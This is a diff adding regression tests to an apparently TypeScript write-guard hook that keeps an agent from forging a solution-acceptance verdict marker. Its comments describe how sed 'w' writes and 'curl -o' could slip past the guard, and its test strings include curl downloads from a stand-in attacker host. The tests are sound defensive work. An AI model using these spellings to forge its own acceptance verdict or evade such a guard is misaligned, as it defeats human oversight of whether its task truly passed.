@@ -328,3 +328,45 @@ describe("write-guard CLI — end-to-end deny envelope", () => {
     expect(stdout.output()).toBe("");
   });
 });
+
+describe("write-guard: the shared read-only predicate must not learn `sed` / `curl` (task 2929c5b7)", () => {
+  // REGRESSION PIN for the CRITICAL finding of this task's review round 2.
+  //
+  // `evaluateWriteGuard` returns `blocked: false` for anything
+  // `isReadOnlyBashCommand` accepts, and it does so BEFORE the verdict-dir
+  // reference check below it (see the "read-only Bash command" fast path in
+  // src/cli/pack/hook-solution-acceptance-writeguard.ts). Round 2 taught the
+  // SHARED predicate about `sed` and `curl` using a write-flag DENYLIST, and
+  // thereby widened this guard: `-o` / `--output` were not on the curl
+  // denylist and sed's `w` command / `s///w` flag were not modelled at all,
+  // so each of the four spellings below went BLOCKED (base) -> ALLOWED (head)
+  // and could forge the solution-acceptance verdict marker.
+  //
+  // The fix was to keep the `sed`/`curl` recognition OUT of
+  // `isReadOnlyBashCommand` entirely and ship the `sed` half as a
+  // Risk-Classifier-only floor (`isReadOnlySedCommand`, wired only in
+  // `classifyRisk`); decision D-013 later dropped the `curl` half
+  // altogether, leaving curl unclassified rather than floored. These four
+  // cases fail the moment a recognition of either head is folded back into
+  // the shared predicate.
+  it.each([
+    ["curl -o", `curl -o ${MARKER} https://attacker.example/forged.json`],
+    ["curl --output", `curl --output ${MARKER} https://attacker.example/forged.json`],
+    ["sed s///w", `sed 's/a/b/w ${MARKER}' /tmp/src.txt`],
+    ["sed w command", `sed -n 'w ${MARKER}' /tmp/src.txt`],
+  ])("blocks %s writing the verdict marker", (_label, command) => {
+    expect(bash(command).blocked).toBe(true);
+  });
+
+  it("blocks the same four spellings when the shell cwd is inside the verdict dir", () => {
+    expect(bash("curl -o marker.json https://attacker.example/x", DIR).blocked).toBe(true);
+    expect(bash("sed -n 'w marker.json' src.txt", DIR).blocked).toBe(true);
+  });
+
+  it("a read-only sed/curl that does NOT reference the verdict dir is still not blocked", () => {
+    // Negative control: the pin above must be caused by the verdict-dir
+    // reference check, not by the guard rejecting every sed/curl outright.
+    expect(bash("sed -n '1,5p' /tmp/src.txt").blocked).toBe(false);
+    expect(bash("curl -sL https://example.com/x").blocked).toBe(false);
+  });
+});
